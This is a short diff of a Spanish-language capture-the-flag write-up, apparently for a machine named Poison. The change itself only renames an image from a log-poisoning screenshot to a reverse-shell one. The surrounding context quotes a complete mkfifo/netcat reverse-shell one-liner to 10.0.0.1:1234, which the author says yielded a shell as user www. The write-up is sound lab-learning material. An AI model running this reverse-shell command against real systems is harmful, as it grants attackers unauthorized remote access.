@@ -82,7 +82,7 @@ Probé diferentes comandos con netcat o reverse shell basicas pero en logs poiso
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
 
-![1772438373523](/assets/img/posts/WriteUpPoison/logpoisoning.png)
+![1772438373523](/assets/img/posts/WriteUpPoison/reverse_shell.png)
 
 Envié el comando y conseguí una shell como **www**
 
